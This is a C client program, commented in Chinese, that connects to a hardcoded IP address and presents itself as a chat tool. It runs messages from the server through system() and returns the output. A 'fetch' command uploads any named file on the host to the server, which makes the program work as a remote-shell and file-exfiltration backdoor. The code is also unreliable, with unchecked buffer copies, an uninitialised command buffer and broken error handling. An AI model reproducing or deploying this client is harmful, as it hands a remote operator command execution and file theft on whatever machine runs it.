#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/time.h>

#define buf_SIZE 1024
#define SIZE 1024 //每次发送文件的大小

//服务器信息
int serv_sock;
struct sockaddr_in serv_adr;

//用于select的集合
fd_set reads;
fd_set cpy_reads;
int fd_max;

//缓存定义
char Recvbuf[buf_SIZE];
char Name[32]; //名字

void error_handling(char *message);
void Shell();
void Read_a_send(char *filename);
void Excute();
void ReturnFile(char *filename);

int main(int argc, char *argv[])
{
    if (argc != 3)
        error_handling("Usage <Port> <Name>");

    serv_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    memset(&serv_adr, 0, sizeof(serv_adr));
    serv_adr.sin_family = AF_INET;
    serv_adr.sin_addr.s_addr = inet_addr("100.2.169.8");
    serv_adr.sin_port = htons(atoi(argv[1]));

    if (connect(serv_sock, (struct sockaddr *)&serv_adr, sizeof(serv_adr)) == -1)
        error_handling("connect() error\n");

    strcpy(Name, argv[2]);
    printf("Name:%s", Name);
    printf("Connect Ok ServerIp %s \t%d\n", inet_ntoa(serv_adr.sin_addr), ntohs(serv_adr.sin_port));

    FD_ZERO(&reads);
    fd_max = serv_sock;
    FD_SET(0, &reads);
    FD_SET(serv_sock, &reads);

    while (1)
    {
        cpy_reads = reads;
        struct timeval time_out;
        time_out.tv_sec = 1;
        time_out.tv_usec = 0;
        int ret = select(fd_max + 1, &cpy_reads, NULL, NULL, &time_out);

        if (ret == -1)
            error_handling("select() error");
        else if (ret == 0)
            continue;
        else
            Shell();
    }

    return 0;
}

void Shell()
{

    if (FD_ISSET(0, &cpy_reads)) //从键盘读取数据
    {
        // char Sendbuf[buf_SIZE + 32 + 1];
        //memset(Sendbuf, 0, buf_SIZE);
        memset(Recvbuf, 0, buf_SIZE);
        read(0, Recvbuf, buf_SIZE - 1);
        //sprintf(Sendbuf, "[%s]%s", Name, Recvbuf);
        //write(serv_sock, Recvbuf, sizeof(Sendbuf));
        write(serv_sock, Recvbuf, strlen(Recvbuf)); //这里测试用strlen();
    }
    if (FD_ISSET(serv_sock, &cpy_reads)) //接受数据，输出到屏幕
    {
        memset(Recvbuf, 0, sizeof(Recvbuf));
        int str_len = read(serv_sock, Recvbuf, buf_SIZE);
        if (str_len == 0) //如果收到长度为0的数据，说明服务器没了
        {
            printf("Server Baboo over!\n");
            close(serv_sock);
            return;
        }

        //对字符串进行分解，提取命令，方便进行不同命令操作
        char deliver[buf_SIZE];
        memcpy(deliver, Recvbuf, sizeof(Recvbuf));
        char *p;
        p = strtok(deliver, " ");
        for (int i = 0; i < 5; i++)
        {
            if (p != NULL)
                p = strtok(NULL, " ");
            if (p == NULL)
                break;
        }

        // if (p != NULL)
        //     printf("Command :%s\n", p);

        char cmd[32];
        if (p != NULL)
            sprintf(cmd, "%s", p);
        if (0 == strcmp(cmd, "ls"))
        {
            Excute(); //执行命令
        }
        else if (0 == strcmp(cmd, "pwd"))
        {
            Excute(); //执行命令
        }
        else if (0 == strcmp(cmd, "fetch"))
        {
            p = strtok(NULL, " ");
            if (p != NULL)
                ReturnFile(p);
            printf("fetch filename :%s\n", p);
        }
        else if (0 == strcmp(cmd, "touch") || 0 == strcmp(cmd, "mkdri"))
            Excute();
        else if (0 == strcmp(cmd, "echo"))
            Excute();
        else if (0 == strcmp(cmd, "push"))
            ;
        else //默认为聊天
            if (Recvbuf[0] != 'e')
            write(1, Recvbuf, sizeof(Recvbuf));
        else
            Excute();
    }
}

void Excute()
{
    puts(Recvbuf);
    int ret = system(Recvbuf);
    if (ret < 0)
        printf("system() error\n");
    //发送文件给Server
    Read_a_send("cmd.txt");
    system("cat cmd.txt");
}

void Read_a_send(char *p)
{
    char filename[32];
    sprintf(filename, "%s", p);
    FILE *fp;
    int totlen;
    char Recvbuf[buf_SIZE];
    if ((fp = fopen(filename, "rb")) == NULL)
        puts("fopen() error\n");
    fseek(fp, 0, SEEK_END);
    totlen = ftell(fp);

    //发送文件长度，方便服务器
    memset(Recvbuf, 0, sizeof(Recvbuf));
    sprintf(Recvbuf, "%d", totlen);
    send(serv_sock, Recvbuf, strlen(Recvbuf) + 1, 0);

    int cnt = totlen / SIZE;
    int len1 = SIZE;
    int lenlast;
    if (totlen % SIZE)
    {
        lenlast = totlen - cnt * SIZE;
        cnt = cnt + 1;
    }
    rewind(fp);

    for (int i = 0; i < cnt - 1; i++)
    {
        fread(Recvbuf, SIZE, 1, fp);
        sleep(0.1);
        send(serv_sock, Recvbuf, SIZE, 0);
        memset(Recvbuf, 0, sizeof(Recvbuf));
    }
    fread(Recvbuf, lenlast, 1, fp);
    fclose(fp);
    send(serv_sock, Recvbuf, lenlast, 0);
}

void ReturnFile(char *filename)
{
    char cmd[32];
    memset(cmd, 0, sizeof(cmd));
    strcpy(cmd, "return fetch");
    send(serv_sock, cmd, strlen(cmd), 0);
    Read_a_send(filename);
}

void error_handling(char *message)
{
    printf("%s", message);
    exit(0);
}
